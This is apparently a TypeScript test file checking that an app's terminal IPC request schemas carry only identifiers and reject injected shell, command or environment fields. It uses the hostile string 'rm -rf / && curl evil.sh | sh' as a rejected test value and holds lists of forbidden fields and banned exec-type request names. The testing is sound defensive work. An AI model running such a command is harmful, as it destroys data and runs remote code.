// P5.1 renderer request contract tests — the five cfApi.terminal requests are
// the ONLY renderer-facing terminal surface, carry identifiers only, and
// structurally cannot express an arbitrary command. Exact-key introspection
// proves there is no generic shell-execution request in the protocol.

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import * as protocol from "../src/protocol.ts";
import {
  CancelOperationRequestSchema,
  GetSnapshotRequestSchema,
  ResetRuntimeRequestSchema,
  RunOperationRequestSchema,
  StopProcessRequestSchema,
  TERMINAL_REQUEST_TYPES,
} from "../src/protocol.ts";

const LONG128 = "a".repeat(128);
const LONG129 = "a".repeat(129);

/** Fields a hostile caller might inject to regain shell access — all must be rejected. */
const FORBIDDEN_FIELDS = [
  "command",
  "cmd",
  "argv",
  "args",
  "cwd",
  "env",
  "image",
  "mount",
  "shell",
  "stdin",
  "resize",
  "script",
  "executable",
];

describe("renderer terminal requests: exact design payloads", () => {
  it("runOperation accepts exactly { session_id, operation_id, request_id }", () => {
    const request = RunOperationRequestSchema.parse({ session_id: "sess-1", operation_id: "install-deps", request_id: "req-0001" });
    assert.equal(request.operation_id, "install-deps");
    assert.deepEqual(Object.keys(RunOperationRequestSchema.shape).sort(), ["operation_id", "request_id", "session_id"]);
  });

  it("stopProcess accepts exactly { session_id, process_id, request_id }", () => {
    StopProcessRequestSchema.parse({ session_id: "sess-1", process_id: "dev-server", request_id: "req-0002" });
    assert.deepEqual(Object.keys(StopProcessRequestSchema.shape).sort(), ["process_id", "request_id", "session_id"]);
  });

  it("cancelOperation accepts exactly { session_id, operation_id, request_id }", () => {
    CancelOperationRequestSchema.parse({ session_id: "sess-1", operation_id: "install-deps", request_id: "req-0003" });
    assert.deepEqual(Object.keys(CancelOperationRequestSchema.shape).sort(), ["operation_id", "request_id", "session_id"]);
  });

  it("resetRuntime accepts exactly { session_id, request_id }", () => {
    ResetRuntimeRequestSchema.parse({ session_id: "sess-1", request_id: "req-0004" });
    assert.deepEqual(Object.keys(ResetRuntimeRequestSchema.shape).sort(), ["request_id", "session_id"]);
  });

  it("getSnapshot accepts exactly { session_id, after_seq } with a safe cursor", () => {
    GetSnapshotRequestSchema.parse({ session_id: "sess-1", after_seq: 0 });
    assert.equal(GetSnapshotRequestSchema.safeParse({ session_id: "sess-1", after_seq: -1 }).success, false);
    assert.equal(GetSnapshotRequestSchema.safeParse({ session_id: "sess-1", after_seq: 1.5 }).success, false);
    assert.deepEqual(Object.keys(GetSnapshotRequestSchema.shape).sort(), ["after_seq", "session_id"]);
  });
});

describe("renderer terminal requests: no arbitrary execution input", () => {
  it("no request schema accepts a command/shell/environment field", () => {
    const schemas = [
      ["runOperation", RunOperationRequestSchema, { session_id: "s", operation_id: "o", request_id: "r" }],
      ["stopProcess", StopProcessRequestSchema, { session_id: "s", process_id: "p", request_id: "r" }],
      ["cancelOperation", CancelOperationRequestSchema, { session_id: "s", operation_id: "o", request_id: "r" }],
      ["resetRuntime", ResetRuntimeRequestSchema, { session_id: "s", request_id: "r" }],
      ["getSnapshot", GetSnapshotRequestSchema, { session_id: "s", after_seq: 0 }],
    ] as const;
    for (const [name, schema, base] of schemas) {
      for (const field of FORBIDDEN_FIELDS) {
        const hostile = { ...base, [field]: "rm -rf / && curl evil.sh | sh" };
        const result = schema.safeParse(hostile);
        assert.equal(result.success, false, `${name} must reject injected "${field}"`);
      }
    }
  });

  it("the protocol exports exactly the five design request schemas — no generic execute request exists", () => {
    const exported = Object.keys(protocol)
      .filter((key) => key.endsWith("RequestSchema"))
      .sort();
    assert.deepEqual(exported, [
      "CancelOperationRequestSchema",
      "GetSnapshotRequestSchema",
      "ResetRuntimeRequestSchema",
      "RunOperationRequestSchema",
      "StopProcessRequestSchema",
    ]);
    assert.deepEqual([...TERMINAL_REQUEST_TYPES].sort(), ["cancelOperation", "getSnapshot", "resetRuntime", "runOperation", "stopProcess"]);
    for (const banned of ["execute", "exec", "runCommand", "spawn", "shell"]) {
      assert.equal(TERMINAL_REQUEST_TYPES.includes(banned as never), false, `no ${banned} request may exist`);
    }
  });

  it("identifiers obey the design bound (1-128 chars)", () => {
    assert.equal(RunOperationRequestSchema.safeParse({ session_id: "", operation_id: "op", request_id: "r" }).success, false);
    assert.equal(RunOperationRequestSchema.safeParse({ session_id: LONG129, operation_id: "op", request_id: "r" }).success, false);
    assert.equal(RunOperationRequestSchema.safeParse({ session_id: LONG128, operation_id: "op", request_id: "r" }).success, true);
  });

  it("onEvent has no IPC payload: it is a preload-local callback only", () => {
    assert.equal("OnEventRequestSchema" in protocol, false);
    assert.equal("OnEventArgsSchema" in protocol, false);
  });
});
